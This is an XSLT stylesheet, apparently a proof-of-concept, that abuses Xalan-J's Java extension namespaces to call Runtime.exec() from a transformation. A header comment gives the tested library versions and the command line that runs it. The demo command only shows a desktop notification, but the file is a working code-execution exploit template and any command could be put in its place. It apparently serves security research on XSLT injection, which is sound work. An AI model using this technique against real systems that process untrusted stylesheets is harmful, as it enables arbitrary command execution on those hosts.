<!-- Tested with xalan-j_2_7_1-bin.zip, Xerces-J-bin.2.11.0.tar.gz on
     OpenJDK 1.7.0_15

    $ LC_ALL=C java -cp xalan.jar:serializer.jar:xercesImpl.jar:xml-apis.jar \
      org.apache.xalan.xslt.Process -in simple.xml -xsl xalan_exec.xsl
-->
<xsl:stylesheet version="1.0"
     xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
     xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"
     xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object"
     exclude-result-prefixes="rt ob">
  <xsl:template match="/">
  <xsl:variable name="runtimeObject" select="rt:getRuntime()"/>
  <xsl:variable name="command"
     select="rt:exec($runtimeObject, &apos;/usr/bin/notify-send SomethingBadHappensHere&apos;)"/>
  <xsl:variable name="commandAsString" select="ob:toString($command)"/>
  <xsl:value-of select="$commandAsString"/>
  </xsl:template>
</xsl:stylesheet>

